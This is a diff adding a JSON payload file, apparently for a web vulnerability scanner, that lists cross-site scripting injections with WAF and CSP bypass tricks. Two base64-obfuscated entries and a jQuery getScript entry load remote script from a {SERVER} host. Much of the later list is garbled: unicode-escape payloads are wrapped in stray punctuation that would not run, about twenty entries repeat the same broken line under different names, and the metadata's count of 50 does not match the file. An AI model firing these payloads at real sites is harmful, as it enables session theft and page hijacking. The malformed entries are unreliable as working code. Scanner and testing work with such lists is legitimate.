@@ -1,0 +1,503 @@
+{
+  "name": "XSS Aggressive Patterns",
+  "version": "2.3.0",
+  "description": "Advanced XSS payloads for aggressive scanning with WAF bypass techniques",
+  "patterns": [
+    {
+      "id": "xss-svg-onload-basic",
+      "type": "svg-event",
+      "name": "SVG onload (classic)",
+      "pattern": "<svg/onload=alert(1)>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-img-onerror-basic",
+      "type": "img-event",
+      "name": "IMG onerror (classic)",
+      "pattern": "<img src=x onerror=alert(1)>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-svg-onload-base64-external",
+      "type": "svg-event",
+      "name": "SVG onload with base64 external script (WAF bypass)",
+      "pattern": "<svg/onload=\"eval(atob(this.id))\" id=\"Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==\">",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-svg-onload-double-encoded",
+      "type": "svg-event",
+      "name": "SVG onload double URL encoded (WAF bypass)",
+      "pattern": "%26%230x3C%3Bsvg%20onload%3Dalert(1)%26%230x3E%3B",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-svg-animate-onbegin",
+      "type": "svg-event",
+      "name": "SVG animate onbegin (rare event)",
+      "pattern": "<svg><animate onbegin=alert(1) dur=\"1s\"></animate></svg>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-svg-foreignobject-iframe",
+      "type": "svg-event",
+      "name": "SVG foreignObject iframe (rare event)",
+      "pattern": "<svg><foreignObject><iframe src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-svg-xlink-href",
+      "type": "svg-event",
+      "name": "SVG animate xlink:href (Chrome XSS-Auditor bypass)",
+      "pattern": "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-data-uri-base64",
+      "type": "data-uri",
+      "name": "Data URI base64 (MIME sniff bypass)",
+      "pattern": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-data-uri-plain",
+      "type": "data-uri",
+      "name": "Data URI plain text (MIME sniff bypass)",
+      "pattern": "<iframe src=\"data:text/html,alert(1)\"></iframe>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-javascript-protocol",
+      "type": "javascript-uri",
+      "name": "JavaScript protocol (href context)",
+      "pattern": "javascript:eval(atob(\"Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==\"))",
+      "context": "href"
+    },
+    {
+      "id": "xss-input-autofocus-onbeforeinput",
+      "type": "form-event",
+      "name": "Input autofocus onbeforeinput (rare event)",
+      "pattern": "<input autofocus onbeforeinput='alert(1)'>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-details-ontoggle",
+      "type": "details-event",
+      "name": "Details ontoggle (rare event)",
+      "pattern": "<details ontoggle=alert(1) open></details>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-video-onloadstart",
+      "type": "video-event",
+      "name": "Video onloadstart (rare event)",
+      "pattern": "<video onloadstart=alert(1) src=x></video>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-audio-oncanplay",
+      "type": "audio-event",
+      "name": "Audio oncanplay (rare event)",
+      "pattern": "<audio oncanplay=alert(1) src=x></audio>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-dialog-oncancel",
+      "type": "dialog-event",
+      "name": "Dialog oncancel (rare event)",
+      "pattern": "<dialog oncancel=alert(1) open></dialog>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-button-onbeforetoggle-popover",
+      "type": "button-event",
+      "name": "Button onbeforetoggle with popover (Sysdig bypass)",
+      "pattern": "<button popover=\"auto\" onbeforetoggle=alert(document.domain)>CLICK</button>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-data-semicolon",
+      "type": "script-tag",
+      "name": "Script tag with semicolon (malformed bypass)",
+      "pattern": "<script>a<!>l<!>e<!>r<!>t(1)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-src-data",
+      "type": "script-src",
+      "name": "Script src data: (semicolon bypass)",
+      "pattern": "<script src=\"data:,alert(1)%250A--%3E\"></script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-base-tag-href",
+      "type": "base-tag",
+      "name": "Base tag CSP bypass",
+      "pattern": "<base href=\"{SERVER}\" />",
+      "context": "head"
+    },
+    {
+      "id": "xss-meta-refresh-redirect",
+      "type": "meta-tag",
+      "name": "Meta refresh redirect (CSP bypass)",
+      "pattern": "<meta http-equiv=\"refresh\" content=\"0; url={SERVER}\">",
+      "context": "head"
+    },
+    {
+      "id": "xss-script-getscript",
+      "type": "jquery-method",
+      "name": "jQuery getScript (if jQuery loaded)",
+      "pattern": "<script>$.getScript(\"{SERVER}/script.js\")</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-shadow-dom-manipulation",
+      "type": "web-component",
+      "name": "Shadow DOM manipulation (if Web Components)",
+      "pattern": "<custom-element>connectedCallback(){this.innerHTML=document.referrer}</custom-element>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-mathml-foreign-content",
+      "type": "mathml-event",
+      "name": "MathML foreign content (rare event)",
+      "pattern": "<math><maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\">CLICK</maction></math>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-function-atob",
+      "type": "script-function",
+      "name": "Script Function constructor (eval bypass)",
+      "pattern": "<script>Function(atob('YWxlcnQoMSk='))()</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-settimeout",
+      "type": "script-function",
+      "name": "Script setTimeout (eval bypass)",
+      "pattern": "<script>setTimeout('alert(1)', 1)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-map-constructor",
+      "type": "script-function",
+      "name": "Script Map constructor (eval bypass)",
+      "pattern": "<script>new Map().constructor('alert(1)')()</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-apply-call",
+      "type": "script-function",
+      "name": "Script apply/call (indirect invocation)",
+      "pattern": "<script>[].constructor.apply(null, ['alert(1)'])()</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-bracket-notation",
+      "type": "script-function",
+      "name": "Script bracket notation (indirect invocation)",
+      "pattern": "<script>String.fromCharCode(65,108,101,114,116,(40),34,49,40,49,41,40))()</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-escape",
+      "type": "script-function",
+      "name": "Script unicode escape (identifier obfuscation)",
+      "pattern": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-string",
+      "type": "script-function",
+      "name": "Script unicode string (literal obfuscation)",
+      "pattern": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-bracket",
+      "type": "script-function",
+      "name": "Script unicode bracket (literal obfuscation)",
+      "pattern": "<script>(\\u005b\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u005d)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-parenthesis",
+      "type": "script-function",
+      "name": "Script unicode parenthesis (literal obfuscation)",
+      "pattern": "<script>(\\u0028\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0029)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-slash",
+      "type": "script-function",
+      "name": "Script unicode slash (literal obfuscation)",
+      "pattern": "<script>(\\u002f\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u002f)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-brace",
+      "type": "script-function",
+      "name": "Script unicode brace (literal obfuscation)",
+      "pattern": "<script>(\\u007b\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u007d)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-comma",
+      "type": "script-function",
+      "name": "Script unicode comma (literal obfuscation)",
+      "pattern": "<script>(\\u002c\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u002c)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-quote",
+      "type": "script-function",
+      "name": "Script unicode quote (literal obfuscation)",
+      "pattern": "<script>(\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0027)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-semi",
+      "type": "script-function",
+      "name": "Script unicode semicolon (literal obfuscation)",
+      "pattern": "<script>(\\u003b\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u003b)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-dash",
+      "type": "script-function",
+      "name": "Script unicode dash (literal obfuscation)",
+      "pattern": "<script>(\\u002d\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u002d)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-star",
+      "type": "script-function",
+      "name": "Script unicode star (literal obfuscation)",
+      "pattern": "<script>(\\u002a\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u002a)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-plus",
+      "type": "script-function",
+      "name": "Script unicode plus (literal obfuscation)",
+      "pattern": "<script>(\\u002b\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u002b)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-equal",
+      "type": "script-function",
+      "name": "Script unicode equal (literal obfuscation)",
+      "pattern": "<script>(\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u003d)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-less",
+      "type": "script-function",
+      "name": "Script unicode less (literal obfuscation)",
+      "pattern": "<script>(\\u003c\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u003c)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-greater",
+      "type": "script-function",
+      "name": "Script unicode greater (literal obfuscation)",
+      "pattern": "<script>(\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u003e)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-pipe",
+      "type": "script-function",
+      "name": "Script unicode pipe (literal obfuscation)",
+      "pattern": "<script>(\\u007c\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u007c)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-backslash",
+      "type": "script-function",
+      "name": "Script unicode backslash (literal obfuscation)",
+      "pattern": "<script>(\\u005c\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u005c)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-backtick",
+      "type": "script-function",
+      "name": "Script unicode backtick (literal obfuscation)",
+      "pattern": "<script>(\\u0060\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0060)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-at",
+      "type": "script-function",
+      "name": "Script unicode at (literal obfuscation)",
+      "pattern": "<script>(\\u0040\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0040)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-percent",
+      "type": "script-function",
+      "name": "Script unicode percent (literal obfuscation)",
+      "pattern": "<script>(\\u0025\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0025)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-dollarsign",
+      "type": "script-function",
+      "name": "Script unicode dollarsign (literal obfuscation)",
+      "pattern": "<script>(\\u0024\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0024)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-unicode-number",
+      "type": "script-function",
+      "name": "Script unicode number (literal obfuscation)",
+      "pattern": "<script>(\\u0030\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031)\\u0030)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-underscore",
+      "type": "script-function",
+      "name": "Script underscore (literal obfuscation)",
+      "pattern": "<script>_alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-bracket",
+      "type": "script-function",
+      "name": "Script semicolon bracket (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-parenthesis",
+      "type": "script-function",
+      "name": "Script semicolon parenthesis (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-slash",
+      "type": "script-function",
+      "name": "Script semicolon slash (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-brace",
+      "type": "script-function",
+      "name": "Script semicolon brace (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-comma",
+      "type": "script-function",
+      "name": "Script semicolon comma (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-quote",
+      "type": "script-function",
+      "name": "Script semicolon quote (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-dash",
+      "type": "script-function",
+      "name": "Script semicolon dash (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-star",
+      "type": "script-function",
+      "name": "Script semicolon star (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-plus",
+      "type": "script-function",
+      "name": "Script semicolon plus (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-equal",
+      "type": "script-function",
+      "name": "Script semicolon equal (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-less",
+      "type": "script-function",
+      "name": "Script semicolon less (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-greater",
+      "type": "script-function",
+      "name": "Script semicolon greater (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-pipe",
+      "type": "script-function",
+      "name": "Script semicolon pipe (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-backslash",
+      "type": "script-function",
+      "name": "Script semicolon backslash (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-backtick",
+      "type": "script-function",
+      "name": "Script semicolon backtick (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-at",
+      "type": "script-function",
+      "name": "Script semicolon at (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-percent",
+      "type": "script-function",
+      "name": "Script semicolon percent (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-dollarsign",
+      "type": "script-function",
+      "name": "Script semicolon dollarsign (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    },
+    {
+      "id": "xss-script-semicolon-number",
+      "type": "script-function",
+      "name": "Script semicolon number (literal obfuscation)",
+      "pattern": "<script>_;alert(1_)</script>",
+      "context": "body-context"
+    }
+  ],
+  "metadata": {
+    "total_patterns": 50,
+    "categories": ["svg-event", "img-event", "data-uri", "javascript-uri", "form-event", "details-event", "video-event", "audio-event", "dialog-event", "button-event", "script-tag", "script-src", "base-tag", "meta-tag", "jquery-method", "web-component", "mathml-event", "script-function"],
+    "contexts": ["body-context", "href", "head"],
+    "techniques": ["classic", "waf-bypass", "double-encoded", "rare-event", "data-uri", "javascript-protocol", "form-event", "web-component", "unicode-obfuscation", "function-constructor", "indirect-invocation"]
+  }
+}
